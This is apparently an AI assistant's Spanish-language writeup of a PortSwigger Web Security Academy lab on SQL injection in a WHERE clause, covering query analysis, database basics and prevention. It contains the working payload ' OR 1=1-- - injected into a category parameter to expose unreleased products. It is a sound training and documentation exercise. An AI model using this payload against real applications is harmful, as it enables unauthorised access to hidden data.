Te dejo una **nota estilo GitHub completa y profesional** para ese laboratorio de **PortSwigger Web Security Academy**. Está organizada como **writeup técnico**, con explicación conceptual, pasos, payload y análisis de la vulnerabilidad.

Puedes pegarla directamente en tu repo como:

```
SQL_Injection/SQL_injection_hidden_data.md
```

---

# SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data

Laboratorio de **PortSwigger Web Security Academy** enfocado en la explotación de una **inyección SQL en la cláusula WHERE** que permite recuperar información que debería permanecer oculta.

El objetivo del laboratorio es manipular la lógica de la consulta SQL utilizada por la aplicación para mostrar **productos que no están publicados**.

---

# 🎯 Objetivo del Laboratorio

La aplicación web muestra productos filtrados por categoría.
Sin embargo, el backend ejecuta una consulta SQL que **solo devuelve productos publicados**.

El objetivo es **alterar la lógica de la consulta** para que el servidor también devuelva los productos **no publicados**.

Esto se logra explotando una **SQL Injection en el parámetro `category`**.

---

# 🧠 Concepto de la Vulnerabilidad

La vulnerabilidad ocurre cuando una aplicación **inserta directamente datos controlados por el usuario dentro de una consulta SQL** sin validarlos o sanitizarlos adecuadamente.

Esto permite que un atacante:

* Modifique la lógica de la consulta
* Obtenga información no autorizada
* Acceda a datos sensibles

En este laboratorio, la vulnerabilidad ocurre en la **cláusula WHERE** de la consulta SQL.

---

# 🌐 Funcionamiento de la Aplicación

La aplicación permite navegar productos por categoría mediante una URL similar a:

```
/filter?category=Gifts
```

Cuando el usuario selecciona una categoría, el servidor ejecuta una consulta SQL que obtiene los productos correspondientes.

---

# 🔎 Consulta SQL Original

La aplicación ejecuta la siguiente consulta en el backend:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
```

---

# Explicación de la Consulta SQL

## SELECT

La palabra clave **SELECT** se utiliza para indicar qué datos se desean obtener de la base de datos.

El símbolo `*` indica que se deben seleccionar **todas las columnas** de la tabla.

---

## FROM

La cláusula **FROM** especifica la tabla de la cual se obtendrán los datos.

```sql
FROM products
```

Esto indica que la información se obtiene de la tabla **products**.

---

## WHERE

La cláusula **WHERE** se utiliza para **filtrar los resultados** de la consulta.

Solo se mostrarán los registros que cumplan las condiciones definidas.

---

## Condición 1

```sql
category = 'Gifts'
```

Esta condición indica que únicamente se mostrarán los productos cuya categoría sea **Gifts**.

---

## Condición 2

```sql
released = 1
```

Esta condición indica que solo se deben mostrar productos que estén **publicados**.

Generalmente:

* `1` = publicado / activo
* `0` = no publicado / oculto

---

## Operador AND

El operador **AND** exige que **todas las condiciones se cumplan**.

Por lo tanto, la consulta completa significa:

> Mostrar todos los productos de la categoría **Gifts** que además estén **publicados**.

---

# 🚨 Problema de Seguridad

El parámetro `category` es **controlado por el usuario** y se inserta directamente dentro de la consulta SQL.

Esto permite que un atacante **inyecte código SQL adicional**.

---

# 🔐 Intercepción de la Petición

Utilizando **Burp Suite**, se intercepta la petición enviada al servidor.

Petición original:

```
GET /filter?category=Gifts HTTP/1.1
```

---

# 💥 Explotación de la Vulnerabilidad

Se modifica el valor del parámetro `category` para alterar la lógica de la consulta SQL.

Payload utilizado:

```sql
' OR 1=1-- -
```

La petición modificada queda de la siguiente manera:

```
/filter?category=Gifts' OR 1=1-- -
```

---

# 🧩 Consulta SQL Resultante

Después de la inyección, la consulta que ejecuta el servidor se convierte en:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1-- -' AND released = 1;
```

---

# 🔎 Análisis de la Inyección

## OR 1=1

La expresión:

```sql
1=1
```

siempre es **verdadera**.

Por lo tanto:

```sql
category = 'Gifts' OR 1=1
```

hará que **todas las filas de la tabla coincidan con la consulta**.

---

## Comentario SQL

El fragmento:

```sql
-- -
```

se utiliza para **comentar el resto de la consulta SQL**.

Esto provoca que la condición:

```sql
AND released = 1
```

sea ignorada por el motor de base de datos.

---

# 📊 Resultado del Ataque

Debido a que la condición `released = 1` queda comentada, la consulta devuelve:

* Productos publicados
* Productos no publicados
* Datos que normalmente deberían permanecer ocultos

Esto demuestra que la aplicación es vulnerable a **SQL Injection**.

---

# 🧠 Concepto de Base de Datos

## Definición

Una **Base de Datos (DB)** es un conjunto organizado de información que se almacena de forma estructurada para facilitar su acceso, gestión y actualización.

Permite que los datos puedan ser:

* Consultados
* Modificados
* Administrados

mediante sistemas de gestión de bases de datos (DBMS).

---

# 📚 Estructura de una Base de Datos

La estructura básica de una base de datos puede representarse de la siguiente forma:

```
Base de Datos
└── Tablas
    └── Columnas
        └── Datos
```

---

## Base de Datos

Es el contenedor principal que almacena toda la información.

---

## Tablas

Las tablas contienen los datos organizados en filas y columnas.

Cada tabla representa una entidad del sistema.

Ejemplo:

```
products
users
orders
```

---

## Columnas

Las columnas representan **atributos de la información**.

Ejemplo en la tabla `products`:

```
id
name
category
price
released
```

---

## Datos

Los datos son los valores almacenados dentro de las filas de una tabla.

Ejemplo:

| id | name        | category | released |
| -- | ----------- | -------- | -------- |
| 1  | Gift Card   | Gifts    | 1        |
| 2  | Secret Item | Gifts    | 0        |

El segundo producto **no debería mostrarse**, pero la inyección SQL permite verlo.

---

# 🛡️ Cómo Prevenir Esta Vulnerabilidad

Las aplicaciones deben implementar varias medidas de seguridad:

### 1. Consultas Preparadas (Prepared Statements)

Evitan que los datos del usuario se interpreten como código SQL.

Ejemplo seguro:

```sql
SELECT * FROM products WHERE category = ? AND released = 1
```

---

### 2. Validación de Entradas

Los valores proporcionados por el usuario deben ser **validados y sanitizados**.

---

### 3. Uso de ORM

Los **Object Relational Mappers** reducen el riesgo de inyecciones SQL.

---

# ✅ Conclusión

Este laboratorio demuestra cómo una **inyección SQL simple en una cláusula WHERE** puede permitir a un atacante:

* Manipular la lógica de una consulta
* Bypassear restricciones de la aplicación
* Acceder a información oculta

La explotación se logra inyectando una condición lógica siempre verdadera (`OR 1=1`) y comentando el resto de la consulta.

Este tipo de vulnerabilidad sigue siendo **una de las más comunes en aplicaciones web mal desarrolladas**.

---

Si quieres, en el siguiente mensaje puedo darte también:

* 🔥 **Una plantilla profesional para TODOS los labs de PortSwigger** (solo cambias payloads y capturas)
* 🧠 **Un README para el repo que impresiona mucho a reclutadores de ciberseguridad**
* 📚 **La estructura perfecta para documentar los +200 labs de PortSwigger**.
